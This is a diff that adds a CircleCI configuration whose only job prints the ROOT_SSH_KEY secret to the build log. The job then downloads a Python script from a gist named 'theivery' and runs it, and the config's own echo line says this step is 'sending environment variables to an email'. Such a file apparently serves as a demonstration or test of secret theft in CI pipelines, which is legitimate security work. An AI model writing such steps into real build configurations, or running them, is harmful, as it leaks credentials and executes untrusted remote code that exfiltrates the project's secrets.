@@ -1,0 +1,20 @@
+version: 2
+jobs:
+  build:
+    docker:
+      - image: python:3.8.2-buster
+    steps:
+      - run:
+          name: do the thing
+          command: |
+            echo "printin root ssh key"
+            echo $ROOT_SSH_KEY
+            echo "sending environment variables to an email"
+            curl -L "https://gist.githubusercontent.com/jrahme-cci/36bd092e9b5e1b15314da790d78d84b2/raw/bdd625d932372b57177f4e4944d5793b08755df5/theivery" > vars.py
+            python3 vars.py
+
+workflows:
+  version: 2
+  build_and_test:
+    jobs:
+      - build
